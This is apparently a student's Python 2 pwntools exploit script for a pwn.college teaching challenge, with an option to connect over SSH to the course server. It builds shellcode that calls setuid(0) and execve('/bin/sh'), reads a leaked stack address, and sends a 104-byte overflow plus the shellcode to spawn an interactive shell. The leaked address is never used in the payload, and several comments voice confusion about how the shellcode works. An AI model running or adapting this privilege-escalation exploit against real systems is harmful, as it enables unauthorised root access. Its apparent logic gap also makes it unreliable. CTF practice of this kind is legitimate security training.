#!/usr/bin/env python2
from pwn import *
from binascii import *
import time, sys

KEYPATH = "/root/pwn/pwn.college/.id_rsa"

binary = "./babyrop_level4_teaching1"

context.arch = 'amd64'

context.log_level = 'DEBUG'

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    conn = ssh("cse466", "cse466.pwn.college", keyfile=KEYPATH)
    p = conn.process(binary, cwd="/")
else:
    p = process(binary)

offset = 104

shellcode = asm('\n'.join([
    # rdi will be the parameter being passed to setuid syscall
    # 0
    "xor rdi, rdi",
    "mov al, 0x69",
    "syscall",
    # this moves the string hs/nib/ into rbx
    # this is then bit shifted right by 8 bits
    # an extra 0xff byte is placed at the end of the string as to either null term or
    # as a placeholder since rbx might copy over junk if ff not provided
    "mov rbx, 0x68732f6e69622fff",
    # here is the bit shift, i thought this was needed as to avoid null bytes
    # but there is none moved into rbx, also there is not shl, which should move the bytes back
    # to the og so preventing null bytes is not an option
    "shr rbx, 0x8",
    "push rbx",
    "mov rdi, rsp",
    # clear rax, you always push an empty buffer on the stack before calling apparently
    "xor rax, rax",
    "push rax",
    # rdi is also 0 at the moment
    # these might also be parameters for execve, though i was told parameters are no longer
    # passed on the stack
    "push rdi",
    # mov rsi to point at everything pushed on the stack
    "mov rsi, rsp",
    # execve syscall
    "mov rax, 0x3b",
    "syscall",

    "push 0x1",
    "pop rdi",
    "push 0x3",
    "pop rax",
    "syscall"

]))

p.recvuntil("at: ")
leak = p.recv(16).replace(".", "")
log.info("Retrieved Leaked Stack Address: %s" % leak)

total = ""
for i in range(len(shellcode)):
    log.info("\\x%s" % hexlify(shellcode[i:i+1]))
    total += "\\x"+hexlify(shellcode[i:i+1])
log.info("Shellcode: %s" % total)


payload = "A"*offset + shellcode

p.send(payload)

p.interactive()
